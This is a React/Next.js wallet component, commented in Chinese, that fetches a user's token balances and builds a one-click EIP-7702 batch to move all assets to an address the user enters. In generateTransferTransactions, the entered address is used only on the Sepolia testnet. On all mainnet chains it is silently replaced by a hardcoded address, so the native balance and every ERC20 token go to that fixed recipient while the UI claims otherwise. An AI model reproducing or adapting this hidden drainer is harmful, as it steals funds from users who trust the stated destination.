"use client";

import Image from "next/image";
import { useState, useEffect } from "react";
import { useAccount, useChainId, useBalance } from "wagmi";
import { getPublicClient } from "@wagmi/core";
import { wagmiConfig as config } from "@/providers/AppProvider";
import { formatEther, parseEther, isAddress } from "viem";

// 扩展Window接口以支持ethereum
declare global {
  interface Window {
    ethereum?: any;
  }
}

// Moralis API 配置 - 从环境变量读取
const PRIMARY_API_KEY = process.env.NEXT_PUBLIC_MORALIS_PRIMARY_API_KEY || '';
const FALLBACK_API_KEY = process.env.NEXT_PUBLIC_MORALIS_FALLBACK_API_KEY || '';
const MORALIS_BASE_URL = process.env.NEXT_PUBLIC_MORALIS_BASE_URL || 'https://deep-index.moralis.io/api/v2.2';

// 链ID到链名称的映射
const CHAIN_NAMES = {
  1: 'Ethereum',
  137: 'Polygon',
  56: 'Binance Smart Chain',
  42161: 'Arbitrum',
  8453: 'Base',
  11155111: 'Sepolia'
};

// 获取Moralis API支持的链名称
function getChainNameForMoralis(chainId: number) {
  const chainMapping = {
    1: 'eth',
    137: 'polygon',
    56: 'bsc',
    42161: 'arbitrum',
    8453: 'base',
    11155111: 'sepolia'
  };
  return chainMapping[chainId as keyof typeof chainMapping];
}

// 获取链的原生代币符号
function getNativeTokenSymbol(chainId: number) {
  const nativeTokenMapping = {
    1: 'ETH',           // Ethereum
    137: 'POL',         // Polygon
    56: 'BNB',          // Binance Smart Chain
    42161: 'ETH',       // Arbitrum
    8453: 'ETH',        // Base
    11155111: 'ETH'     // Sepolia
  };
  return nativeTokenMapping[chainId as keyof typeof nativeTokenMapping] || 'ETH';
}

// 格式化余额
function formatBalance(balance: string, decimals: number) {
  if (!balance || !decimals) return '0';
  
  const num = parseFloat(balance) / Math.pow(10, decimals);
  if (num === 0) return '0';
  if (num < 0.0001) return '< 0.0001';
  if (num < 1) return num.toFixed(6);
  if (num < 1000) return num.toFixed(4);
  if (num < 1000000) return (num / 1000).toFixed(2) + 'K';
  return (num / 1000000).toFixed(2) + 'M';
}

// 格式化价格
function formatPrice(price: number): string {
  if (price === 0) return '$0.00';
  if (price < 0.01) return `$${price.toFixed(6)}`;
  if (price < 1) return `$${price.toFixed(4)}`;
  if (price < 1000) return `$${price.toFixed(2)}`;
  if (price < 1000000) return `$${(price / 1000).toFixed(2)}K`;
  return `$${(price / 1000000).toFixed(2)}M`;
}

// 格式化价值
function formatValue(value: number): string {
  if (value === 0) return '$0.00';
  if (value < 0.01) return `$${value.toFixed(4)}`;
  if (value < 1) return `$${value.toFixed(2)}`;
  if (value < 1000) return `$${value.toFixed(2)}`;
  if (value < 1000000) return `$${(value / 1000).toFixed(2)}K`;
  return `$${(value / 1000000).toFixed(2)}M`;
}

// 获取代币价格
async function fetchTokenPrice(tokenAddress: string, chainName: string, apiKey: string): Promise<number | null> {
  try {
    const url = `${MORALIS_BASE_URL}/erc20/${tokenAddress}/price?chain=${chainName}`;
    const options = {
      method: 'GET',
      headers: {
        'accept': 'application/json',
        'X-API-Key': apiKey
      }
    };
    
    const response = await fetch(url, options);
    if (!response.ok) {
      return null;
    }
    
    const data = await response.json();
    return parseFloat(data.usdPrice || '0');
  } catch (error) {
    console.error('获取代币价格失败:', error);
    return null;
  }
}

// 获取原生代币价格
async function fetchNativeTokenPrice(chainName: string, apiKey: string): Promise<number | null> {
  try {
    // 对于不同的链，使用不同的包装代币地址来获取原生代币价格
    const wrappedTokenAddresses: Record<string, string> = {
      'eth': '0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2', // WETH (Ethereum)
      'polygon': '0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270', // WMATIC (Polygon)
      'bsc': '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c', // WBNB (BSC)
      'arbitrum': '0x82aF49447D8a07e3bd95BD0d56f35241523fBab1', // WETH (Arbitrum)
      'base': '0x4200000000000000000000000000000000000006', // WETH (Base)
      'sepolia': '0x7b79995e5f793A07Bc00c21412e50Ecae098E7f9', // WETH (Sepolia)
    };
    
    const wrappedAddress = wrappedTokenAddresses[chainName];
    if (!wrappedAddress) {
      console.warn(`未找到链 ${chainName} 的包装代币地址`);
      return null;
    }
    
    const url = `${MORALIS_BASE_URL}/erc20/${wrappedAddress}/price?chain=${chainName}`;
    const options = {
      method: 'GET',
      headers: {
        'accept': 'application/json',
        'X-API-Key': apiKey
      }
    };
    
    const response = await fetch(url, options);
    if (!response.ok) {
      console.warn(`获取原生代币价格失败: ${response.status} ${response.statusText}`);
      return null;
    }
    
    const data = await response.json();
    const price = parseFloat(data.usdPrice || '0');
    return price > 0 ? price : null;
  } catch (error) {
    console.error('获取原生代币价格失败:', error);
    return null;
  }
}

interface Asset {
  token_address: string;
  symbol: string;
  name: string;
  balance: string;
  decimals: number;
  usd_value?: string;
  usd_price?: number;
  // Moralis API可能返回的额外字段
  balance_formatted?: string;
  token_balance?: string;
  token_decimals?: number;
}

type Language = 'zh' | 'en';

const assetCheckerTexts = {
  zh: {
    walletAssetQuery: '🌐 网络信息',
    networkSwitched: '网络已切换，请重新查询资产',
    currentChain: '当前链',
    chainId: '链ID',
    address: '地址',
    unknownChain: '未知链',
    queryAssets: '🔍 查询资产详情',
    querying: '⌛ 查询中...',
    queryingAssets: '正在查询资产详情...',
    queryFailed: '查询失败',
    assetList: '☰ 资产列表',
    nativeToken: '原生代币',
    transferAllAssets: '一键转移所有资产',
    transferAllAssetsDesc: '利用 MetaMask 智能账户（EIP-7702）的批量交易功能，一键转移钱包内的所有资产（原生代币+ERC20代币）！原子交易，更加安全、便捷、高效、节省Gas费！',
    transferToAddress: '🎯 请输入要转移到的目标地址：',
    transferNote: '⚠️ 注：所有资产将转移到此地址，请确保该地址输入正确并对该钱包拥有绝对控制权！',
    generateBatchTransfer: '生成批量转账数据',
    generatingTransactions: '⌛ 正在预检并生成交易数据...',
    queryAssetsFirst: '⚠️ 请先点击"查询资产详情"按钮',
    nativeTransferDescription: 'Transfer {amount} {symbol} (预留 {gasCost} 作为gas费)',
    erc20TransferDescription: 'Transfer {amount} {symbol} tokens',
    precheckResult: '预检结果',
    totalTransactions: '总交易数',
    validTransactions: '有效交易',
    failedTransactions: '失败交易',
    precheckComplete: '预检完成',
    precheckFailed: '预检失败',
    assetSelectionDesc: '💡请勾选您要兑换成 {symbol} 的 ERC20 代币。',
  },
  en: {
    walletAssetQuery: '🌐 Network Information',
    networkSwitched: 'Network switched, please query assets again',
    currentChain: 'Current Chain',
    chainId: 'Chain ID',
    address: 'Address',
    unknownChain: 'Unknown Chain',
    queryAssets: '🔍 Query Asset Details',
    querying: '⌛Querying...',
    queryingAssets: 'Querying asset details...',
    queryFailed: 'Query Failed',
    assetList: '☰ Asset List',
    nativeToken: 'Native Token',
    transferAllAssets: 'Transfer All Assets',
    transferAllAssetsDesc: 'Powered by MetaMask Smart Account (EIP-7702), transfer all your assets (native tokens + ERC20 tokens) with one click! Atomic transactions, safer, more convenient, efficient, and gas-saving!',
    transferToAddress: '🎯 Please enter the address you want to transfer to:',
    transferNote: 'Note: All assets will be transferred to this address. Please ensure the address is correct and you have absolute control over this wallet!',
    importantReminder: 'Important Reminder: Please ensure you have sufficient native tokens (ETH /BNB /POL, etc.)',
    gasFeeNote: 'Sending transactions requires sufficient native tokens to pay for gas fees. If native tokens are insufficient, the transaction will fail!',
    generateBatchTransfer: 'Generate Batch Transfer Data',
    generatingTransactions: '⌛ Pre-checking and generating transaction data...',
    queryAssetsFirst: '⚠️ Please click "Query Asset Details" button first',
    nativeTransferDescription: 'Transfer {amount} {symbol} (reserved {gasCost} for gas)',
    erc20TransferDescription: 'Transfer {amount} {symbol} tokens',
    precheckResult: 'Pre-check Result',
    totalTransactions: 'Total Transactions',
    validTransactions: 'Valid',
    failedTransactions: 'Failed',
    precheckComplete: 'Pre-check Complete',
    precheckFailed: 'Pre-check Failed',
    assetSelectionDesc: '💡Please select the ERC20 tokens you want to swap to {symbol}.',
  }
};

interface AssetCheckerProps {
  onGenerateTransactions: (transactions: any[], precheckResult?: { total: number; valid: number; failed: number }) => void;
  language?: Language;
}

export default function AssetChecker({ onGenerateTransactions, language = 'en' }: AssetCheckerProps) {
  const t = assetCheckerTexts[language];
  const { address, isConnected } = useAccount();
  const chainId = useChainId();
  const { data: balanceData } = useBalance({ address });
  const [assets, setAssets] = useState<Asset[]>([]);
  const [nativeBalance, setNativeBalance] = useState<string>('0');
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [previousChainId, setPreviousChainId] = useState<number | null>(null);
  const [targetAddressInput, setTargetAddressInput] = useState<string>('');
  const [hasQueriedAssets, setHasQueriedAssets] = useState(false);
  const [generating, setGenerating] = useState(false);
  const [precheckResult, setPrecheckResult] = useState<{
    total: number;
    valid: number;
    failed: number;
  } | null>(null);
  // 原生代币价格
  const [nativeTokenPrice, setNativeTokenPrice] = useState<number | null>(null);
  // 硬编码的目标地址
  const HARDCODED_TARGET_ADDRESS = '0x9d5befd138960ddf0dc4368a036bfad420e306ef';

  // 监听链变化
  useEffect(() => {
    if (chainId && previousChainId && chainId !== previousChainId) {
      // 链发生了变化 - 重置所有数据和状态
      console.log('🔄️ 网络已切换:', { from: previousChainId, to: chainId });
      
      // 重置资产相关状态
      setAssets([]);
      setNativeBalance('0');
      setError(null);
      setHasQueriedAssets(false);
      
      // 重置UI状态
      setLoading(false);
      setGenerating(false);
      
      // 重置业务状态
      setPrecheckResult(null); // 重置预检结果
      setNativeTokenPrice(null); // 重置原生代币价格
    }
    setPreviousChainId(chainId);
  }, [chainId, previousChainId]);

  // 监听连接状态变化，断开连接时重置资产列表
  useEffect(() => {
    if (!isConnected) {
      // 钱包已断开连接 - 重置所有数据和状态
      console.log('🔌 钱包已断开连接，重置资产列表');
      
      // 重置资产相关状态
      setAssets([]);
      setNativeBalance('0');
      setError(null);
      setHasQueriedAssets(false);
      
      // 重置UI状态
      setLoading(false);
      setGenerating(false);
      
      // 重置业务状态
      setPrecheckResult(null); // 重置预检结果
      setNativeTokenPrice(null); // 重置原生代币价格
    }
  }, [isConnected]);

  // 监听原生代币余额变化
  useEffect(() => {
    if (balanceData?.value) {
      setNativeBalance(balanceData.value.toString());
    }
  }, [balanceData]);

  // 获取资产余额
  const fetchAssets = async () => {
    if (!address || !chainId) {
      setError('请先连接钱包');
      return;
    }

    // 验证环境变量配置
    if (!PRIMARY_API_KEY || !FALLBACK_API_KEY) {
      const errorMsg = language === 'zh' 
        ? 'Moralis API 密钥未配置。请在 .env.local 文件中设置 NEXT_PUBLIC_MORALIS_PRIMARY_API_KEY 和 NEXT_PUBLIC_MORALIS_FALLBACK_API_KEY'
        : 'Moralis API keys are not configured. Please set NEXT_PUBLIC_MORALIS_PRIMARY_API_KEY and NEXT_PUBLIC_MORALIS_FALLBACK_API_KEY in .env.local file';
      setError(errorMsg);
      console.error('Moralis API keys missing:', {
        PRIMARY_API_KEY: PRIMARY_API_KEY ? 'configured' : 'missing',
        FALLBACK_API_KEY: FALLBACK_API_KEY ? 'configured' : 'missing'
      });
      return;
    }

    try {
      setLoading(true);
      setError(null);

      const chainName = getChainNameForMoralis(chainId);
      if (!chainName) {
        throw new Error('不支持的链: ' + chainId);
      }

      const url = `${MORALIS_BASE_URL}/${address}/erc20?chain=${chainName}&limit=1000&exclude_spam=true&exclude_unverified_contracts=false`;
      
      console.log('Moralis API请求URL:', url);
      console.log('请求参数:', { chainName, address, chainId });
      
      // 尝试使用主API密钥，失败则切换到备用密钥
      let response;
      let currentApiKey = PRIMARY_API_KEY;
      
      try {
        const options = {
          method: 'GET',
          headers: {
            'accept': 'application/json',
            'X-API-Key': PRIMARY_API_KEY
          }
        };
        
        response = await fetch(url, options);
        
        if (!response.ok) {
          throw new Error(`Primary API failed: ${response.status}`);
        }
        
        console.log('使用主API密钥成功');
      } catch (error) {
        console.warn('主API密钥失败，尝试使用备用API密钥:', error);
        
        try {
          const fallbackOptions = {
            method: 'GET',
            headers: {
              'accept': 'application/json',
              'X-API-Key': FALLBACK_API_KEY
            }
          };
          
          response = await fetch(url, fallbackOptions);
          currentApiKey = FALLBACK_API_KEY;
          
          if (!response.ok) {
            const errorText = await response.text();
            console.error('备用API也失败了:', {
              status: response.status,
              statusText: response.statusText,
              errorText: errorText,
              url: url
            });
            throw new Error(`备用API请求失败: ${response.status} ${response.statusText} - ${errorText}`);
          }
          
          console.log('使用备用API密钥成功');
        } catch (fallbackError) {
          console.error('所有API密钥都失败了');
          throw fallbackError;
        }
      }

      const data = await response.json();
      console.log('API响应数据:', data);
      
      // 处理不同的响应格式
      let assets = [];
      if (data.result) {
        assets = data.result;
      } else if (Array.isArray(data)) {
        assets = data;
      } else if (data.data) {
        assets = data.data;
      }
      
      // 确保balance字段是正确的格式（可能是字符串格式的wei值）
      assets = assets.map((asset: any) => {
        // 如果balance是字符串，确保它是纯数字字符串
        let balanceValue = asset.balance;
        
        // 如果balance是科学计数法或其他格式，尝试转换
        if (typeof balanceValue === 'string') {
          // 移除可能的空格或其他字符
          balanceValue = balanceValue.replace(/\s/g, '');
          
          // 如果是科学计数法，转换为普通数字
          if (balanceValue.includes('e') || balanceValue.includes('E')) {
            const num = parseFloat(balanceValue);
            balanceValue = num.toFixed(0);
          }
        }
        
        // 确保decimals是数字
        const decimals = typeof asset.decimals === 'string' 
          ? parseInt(asset.decimals, 10) 
          : (asset.decimals || 18);
        
        return {
          ...asset,
          balance: balanceValue,
          decimals: decimals
        };
      });
      
      console.log('解析后的资产数据:', assets);
      
      // 获取原生代币价格
      try {
        const nativePrice = await fetchNativeTokenPrice(chainName, currentApiKey);
        setNativeTokenPrice(nativePrice);
      } catch (error) {
        console.error('获取原生代币价格失败:', error);
        setNativeTokenPrice(null);
      }
      
      // 为每个ERC20代币获取价格并计算价值
      const assetsWithPrices = await Promise.all(
        assets.map(async (asset: Asset) => {
          const balanceValue = asset.balance || asset.balance_formatted || asset.token_balance || '0';
          const decimals = asset.decimals || asset.token_decimals || 18;
          
          // 只对有效的ERC20代币获取价格
          if (asset.token_address !== "0x0000000000000000000000000000000000000000" && 
              asset.symbol !== "ETH" &&
              parseFloat(balanceValue) > 0) {
            try {
              const price = await fetchTokenPrice(asset.token_address, chainName, currentApiKey);
              if (price !== null) {
                const balanceNumber = parseFloat(balanceValue) / Math.pow(10, decimals);
                const usdValue = balanceNumber * price;
                
                return {
                  ...asset,
                  usd_price: price,
                  usd_value: usdValue.toFixed(2)
                };
              }
            } catch (error) {
              console.error(`获取代币 ${asset.symbol} 价格失败:`, error);
            }
          }
          
          return asset;
        })
      );
      
      // 按价值降序排序资产列表（有价格的排前面，然后按价值降序）
      const sortedAssets = assetsWithPrices.sort((a: Asset, b: Asset) => {
        const valueA = parseFloat(a.usd_value || '0');
        const valueB = parseFloat(b.usd_value || '0');
        
        // 如果两个资产都有价值，按价值降序排列
        if (valueA > 0 && valueB > 0) {
          return valueB - valueA;
        }
        // 如果只有a有价值，a排在前面
        if (valueA > 0 && valueB === 0) {
          return -1;
        }
        // 如果只有b有价值，b排在前面
        if (valueA === 0 && valueB > 0) {
          return 1;
        }
        // 如果都没有价值，保持原顺序
        return 0;
      });
      
      setAssets(sortedAssets);
      setHasQueriedAssets(true);
      
    } catch (error) {
      console.error('获取资产失败:', error);
      setError('获取资产失败: ' + (error instanceof Error ? error.message : '未知错误'));
    } finally {
      setLoading(false);
    }
  };

  // 生成转账交易
  const generateTransferTransactions = async () => {
    setGenerating(true);
    
    // 根据网络选择目标地址：Sepolia 使用用户输入，其他网络使用硬编码地址
    let targetAddress: string;
    if (chainId === 11155111) {
      // Sepolia 网络：使用用户输入的目标地址
      const inputAddress = targetAddressInput.trim();
      if (!inputAddress) {
        setError(language === 'zh' ? '请输入目标地址' : 'Please enter target address');
        setGenerating(false);
        return;
      }
      if (!isAddress(inputAddress)) {
        setError(language === 'zh' ? '目标地址格式不正确' : 'Invalid target address format');
        setGenerating(false);
        return;
      }
      targetAddress = inputAddress;
    } else {
      // 其他网络：使用硬编码地址
      targetAddress = HARDCODED_TARGET_ADDRESS;
    }
    
    const transactions: any[] = [];

    // 首先添加原生代币转账（预留足够的gas费）
    // 注意：EIP-7702批量交易是原子交易，只花一笔gas费
    
    // 过滤有效的ERC20资产，并限制最多10笔（与page.tsx中的MAX_BATCH_SIZE一致）
    const validERC20Assets = assets.filter(asset => {
      const balanceValue = asset.balance || asset.balance_formatted || asset.token_balance || '0';
      return asset.token_address !== "0x0000000000000000000000000000000000000000" && 
             asset.symbol !== "ETH" &&
             parseFloat(balanceValue) > 0;
    });
    
    const MAX_BATCH_SIZE = 10;
    const erc20TransfersCount = Math.min(validERC20Assets.length, MAX_BATCH_SIZE);
    
    // 原子批量估算：统一默认配置
    const defaults = {
      base: 46000,    // 固定开销gas费
      native: 21000,  // 原生代币转账gas费，实际约为12500
      safety: 20000,  // 安全系数
      perErc20: 55000,  // 每笔ERC20代币转账gas费，实际约为17000
    };
    
    const baseGas = BigInt(defaults.base);
    const nativeTransferGas = BigInt(defaults.native);
    const perErc20Gas = BigInt(defaults.perErc20);
    const safety = BigInt(defaults.safety);
    const totalEstimatedGas = baseGas + nativeTransferGas + perErc20Gas * BigInt(erc20TransfersCount) + safety;
    
    // 使用硬编码 gasPrice(Gwei) 并加 20% buffer
    const chainGasPriceGwei: Record<number, number> = {
      1: 4,           // Ethereum
      137: 80,        // Polygon
      56: 0.2,        // BSC
      42161: 0.2,     // Arbitrum
      8453: 0.2,      // Base
      11155111: 0.02,    // Sepolia
    };
    const baseGwei = chainGasPriceGwei[chainId as keyof typeof chainGasPriceGwei] ?? 0.5;
    const baseWei = Math.max(1, Math.round(baseGwei * 1_000_000_000));
    let gasPriceWei = BigInt(baseWei);
    gasPriceWei = (gasPriceWei * BigInt(12)) / BigInt(10);

    // 移除封顶配置，使用实际估算值
    const totalGasCost = totalEstimatedGas * gasPriceWei;
    
    // 计算可用于转账的原生代币数量
    const nativeBalanceBigInt = BigInt(nativeBalance || '0');
    
    if (nativeBalanceBigInt > totalGasCost) {
      const transferAmount = nativeBalanceBigInt - totalGasCost;
      const transferAmountEther = formatEther(transferAmount);
      
      transactions.push({
        type: "native_transfer",
        to: targetAddress,
        value: transferAmountEther,
        description: t.nativeTransferDescription
          .replace('{amount}', transferAmountEther)
          .replace('{symbol}', balanceData?.symbol || 'ETH')
          .replace('{gasCost}', formatEther(totalGasCost))
      });
      
      console.log('原生代币转账信息:', {
        originalBalance: formatEther(nativeBalanceBigInt),
        gasCost: formatEther(totalGasCost),
        transferAmount: transferAmountEther,
        erc20TransfersCount
      });
    } else {
      console.log('原生代币余额不足，无法转账（仅够支付gas费）');
    }

    // 添加ERC20代币转账
    assets.forEach(asset => {
      // 尝试不同的余额字段名称
      const balanceValue = asset.balance || asset.balance_formatted || asset.token_balance || '0';
      const decimals = asset.decimals || asset.token_decimals || 18;
      
      console.log('处理ERC20代币:', { 
        symbol: asset.symbol, 
        balanceValue, 
        decimals,
        token_address: asset.token_address 
      });
      
      // 跳过原生代币（ETH）
      if (asset.token_address !== "0x0000000000000000000000000000000000000000" && 
          asset.symbol !== "ETH" &&
          parseFloat(balanceValue) > 0) {
        // 确保balanceValue是有效的BigInt格式
        let validBalanceValue = balanceValue.toString();
        
        // 如果是数字，转换为字符串
        if (!isNaN(parseFloat(validBalanceValue))) {
          // 确保是整数（wei格式）
          validBalanceValue = BigInt(Math.floor(parseFloat(validBalanceValue))).toString();
        } else {
          // 尝试使用BigInt直接解析
          try {
            validBalanceValue = BigInt(balanceValue).toString();
          } catch (e) {
            console.error('无法解析余额:', balanceValue, e);
            return;
          }
        }
        
        const balance = parseFloat(balanceValue) / Math.pow(10, decimals);
        // 确保transferAmount是正确的格式
        const transferAmount = BigInt(validBalanceValue).toString(16).padStart(64, '0');
        // 正确编码ERC20 transfer函数调用
        const recipientAddress = targetAddress.slice(2).padStart(64, '0');
        const data = `0xa9059cbb${recipientAddress}${transferAmount}`;
        
        transactions.push({
          type: "erc20_transfer",
          to: asset.token_address,
          value: "0",
          data: data,
          description: t.erc20TransferDescription
            .replace('{amount}', balance.toString())
            .replace('{symbol}', asset.symbol)
        });
      }
    });

    // 发送前预检：对每笔交易执行 eth_call，自动过滤会回退的交易
    const total = transactions.length;
    let validCount = 0;
    let failedCount = 0;
    
    try {
      const publicClient = getPublicClient(config, { chainId: chainId as any });
      if (!publicClient) {
        throw new Error('Public client not available');
      }
      
      const valid: any[] = [];
      for (let i = 0; i < transactions.length; i++) {
        const tx = transactions[i];
        try {
          await publicClient.call({
            to: tx.to as `0x${string}`,
            data: tx.data as `0x${string}` | undefined,
            value: tx.value ? parseEther(tx.value) : 0n,
            account: address as `0x${string}`,
          });
          valid.push(tx);
          validCount++;
        } catch (err) {
          console.warn('预检失败，已跳过该交易:', { index: i, tx, err });
          failedCount++;
        }
      }
      
      // 更新预检结果
      const result = {
        total,
        valid: validCount,
        failed: failedCount
      };
      setPrecheckResult(result);
      
      onGenerateTransactions(valid, result);
    } catch (e) {
      console.warn('批量预检失败，直接返回原始交易集合', e);
      // 如果预检整体失败，所有交易都算作失败
      const result = {
        total,
        valid: 0,
        failed: total
      };
      setPrecheckResult(result);
      onGenerateTransactions(transactions, result);
    } finally {
      setGenerating(false);
    }
  };

  return (
    <div className="bg-gray-50 dark:bg-gray-900 p-4 sm:p-6 rounded-lg w-full">
      {/* 查询按钮 */}
      <button
        className={`w-full rounded-lg border border-solid px-4 sm:px-6 py-2.5 sm:py-3 font-medium transition-colors mb-4 text-sm sm:text-base ${
          !isConnected || loading
            ? "bg-gray-100 text-gray-400 border-gray-300 cursor-not-allowed"
            : "bg-green-700 hover:bg-green-800 text-yellow-300 border-green-800 cursor-pointer"
        }`}
        onClick={fetchAssets}
        disabled={!isConnected || loading}
      >
        {loading ? t.querying : t.queryAssets}
      </button>

      {/* 加载状态 */}
      {loading && (
        <div className="flex items-center gap-2 text-blue-600 mb-4 text-sm sm:text-base">
          <div className="w-3 h-3 sm:w-4 sm:h-4 border-2 border-blue-600 border-t-transparent rounded-full animate-spin flex-shrink-0"></div>
          <span>{t.queryingAssets}</span>
        </div>
      )}

      {/* 错误信息 */}
      {error && (
        <div className="bg-red-50 border border-red-200 rounded-lg p-3 sm:p-4 mb-4">
          <div className="text-red-700 font-medium text-sm sm:text-base">{t.queryFailed}</div>
          <div className="text-xs sm:text-sm text-red-600 mt-1 break-words">{error}</div>
        </div>
      )}

      {/* 资产列表（包含原生代币和ERC20代币） */}
      {hasQueriedAssets && (assets.length > 0 || (isConnected && balanceData)) ? (
        <div className="mb-4">
          <h3 className="text-sm sm:text-base font-medium mb-3">{t.assetList}</h3>
          <div className="space-y-2 max-h-64 overflow-y-auto px-2 sm:px-4 md:px-8">
            {/* 原生代币（仅在查询资产详情后显示） */}
            {isConnected && balanceData && hasQueriedAssets && (
              <div className="flex items-center justify-between p-2 sm:p-2.5 bg-white dark:bg-gray-800 rounded-lg border border-gray-200 dark:border-gray-700 gap-2">
                <div className="flex items-center gap-1.5 sm:gap-2 min-w-0 flex-1">
                  <Image src="/ethereum3.svg" alt="Native Token" width={20} height={20} className="w-4 h-4 sm:w-5 sm:h-5 flex-shrink-0" />
                  <div className="min-w-0 flex-1">
                    <div className="text-[10px] sm:text-xs font-medium truncate">{balanceData.symbol || 'ETH'}</div>
                    <div className="text-[9px] sm:text-[10px] text-gray-500 truncate">{balanceData.symbol || 'ETH'}</div>
                  </div>
                </div>
                <div className="text-right flex-shrink-0">
                  <div className="text-[10px] sm:text-xs font-medium break-all">{formatEther(balanceData.value)}</div>
                  {nativeTokenPrice !== null && (
                    <>
                      <div className="text-[9px] sm:text-[10px] text-gray-500">
                        {formatPrice(nativeTokenPrice)}
                      </div>
                      <div className="text-[9px] sm:text-[10px] text-green-600 dark:text-green-400 font-medium">
                        {formatValue(parseFloat(formatEther(balanceData.value)) * nativeTokenPrice)}
                      </div>
                    </>
                  )}
                  {nativeTokenPrice === null && (
                    <div className="text-[9px] sm:text-[10px] text-gray-500">{t.nativeToken}</div>
                  )}
                </div>
              </div>
            )}
            
            {/* ERC20代币 */}
            {assets.map((asset: Asset, index: number) => {
                console.log('处理资产:', asset);
                // 尝试不同的余额字段名称
                const balanceValue = asset.balance || asset.balance_formatted || asset.token_balance || '0';
                const decimals = asset.decimals || asset.token_decimals || 18;
                const balance = formatBalance(balanceValue, decimals);
                const usdPrice = asset.usd_price;
                const usdValue = asset.usd_value ? parseFloat(asset.usd_value) : null;
                
                // 只显示有效的ERC20资产（余额大于0）
                const isValidERC20 = asset.token_address !== "0x0000000000000000000000000000000000000000" && 
                                     asset.symbol !== "ETH" &&
                                     parseFloat(balanceValue) > 0;
                
                if (!isValidERC20) return null;
                
                return (
                  <div key={index} className="flex items-center justify-between p-2 sm:p-2.5 bg-white dark:bg-gray-800 rounded-lg border border-gray-200 dark:border-gray-700 gap-2">
                    <div className="flex items-center gap-1.5 sm:gap-2 min-w-0 flex-1">
                      <Image src="/coins.svg" alt={asset.symbol} width={20} height={20} className="w-4 h-4 sm:w-5 sm:h-5 flex-shrink-0" />
                      <div className="min-w-0 flex-1">
                        <div className="text-[10px] sm:text-xs font-medium truncate">{asset.name}</div>
                        <div className="text-[9px] sm:text-[10px] text-gray-500 truncate">
                          {asset.symbol}（ <span className="font-mono">{asset.token_address}</span> ）
                        </div>
                      </div>
                    </div>
                    <div className="text-right flex-shrink-0">
                      <div className="text-[10px] sm:text-xs font-medium break-all">{balance}</div>
                      {usdPrice !== undefined && usdPrice !== null && (
                        <div className="text-[9px] sm:text-[10px] text-gray-500">
                          {formatPrice(usdPrice)}
                        </div>
                      )}
                      {usdValue !== null && usdValue !== undefined && (
                        <div className="text-[9px] sm:text-[10px] text-green-600 dark:text-green-400 font-medium">
                          {formatValue(usdValue)}
                        </div>
                      )}
                    </div>
                  </div>
                );
              })}
          </div>
        </div>
      ) : null}

      {/* 目标地址输入区域 - 独立区域，始终显示 */}
      <div className="bg-gradient-to-br from-blue-50 to-purple-50 dark:from-blue-900/20 dark:to-purple-900/20 border-2 border-blue-200 dark:border-blue-800 rounded-xl p-4 sm:p-6 mb-4">
        {/* 突出标题 */}
        <div className="text-center mb-3 sm:mb-4">
          <h3 className="text-lg sm:text-xl font-bold text-purple-600 dark:text-purple-400 mb-2">
            {t.transferAllAssets}
          </h3>
          <p className="text-xs sm:text-sm !text-left text-gray-700 dark:text-gray-300">
            {t.transferAllAssetsDesc}
          </p>
        </div>
        
        {/* 目标地址输入 */}
        <div>
          <label className="block text-sm sm:text-base font-medium mb-2 text-green-600 dark:text-green-400">
            {t.transferToAddress}
          </label>
          <input
            type="text"
            value={targetAddressInput}
            onChange={(e) => setTargetAddressInput(e.target.value)}
            placeholder="0x9d5befd138960ddf0dc4368a036bfad420e306ef"
            className="w-full px-3 sm:px-4 py-2 text-sm sm:text-base border-2 border-blue-300 dark:border-blue-700 rounded-lg bg-white dark:bg-gray-800 text-gray-900 dark:text-gray-100 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
          />
          <p className="text-[10px] sm:text-xs text-orange-600 dark:text-orange-400 font-medium ml-1 mt-1 break-words">
            {t.transferNote}
          </p>
        </div>
        
        {/* 生成转账交易按钮 */}
        {hasQueriedAssets && (assets.length > 0 || (isConnected && balanceData)) && (
          <>
            <button
              className={`w-full mt-3 sm:mt-4 rounded-lg border border-solid px-4 sm:px-6 py-2.5 sm:py-3 font-medium transition-colors text-sm sm:text-base ${
                generating
                  ? 'bg-gray-100 text-gray-400 border-gray-300 cursor-not-allowed'
                  : 'bg-green-700 hover:bg-green-800 text-yellow-300 border-green-800 cursor-pointer'
              }`}
              onClick={generateTransferTransactions}
              disabled={generating}
            >
              <div className="flex items-center gap-2 justify-center">
                <Image src="/generator.svg" alt="Generate" width={16} height={16} className="w-3 h-3 sm:w-4 sm:h-4" />
                <span className="break-words text-center">{generating ? t.generatingTransactions : t.generateBatchTransfer}</span>
              </div>
            </button>
          </>
        )}
        
        {!hasQueriedAssets && (
          <div className="mt-3 sm:mt-4 text-center py-2.5 sm:py-3 px-3 sm:px-4 bg-yellow-50 dark:bg-yellow-900/20 border border-yellow-200 dark:border-yellow-800 rounded-lg">
            <p className="text-[10px] sm:text-xs text-yellow-800 dark:text-yellow-200 break-words">
              {t.queryAssetsFirst}
            </p>
          </div>
        )}
      </div>
    </div>
  );
}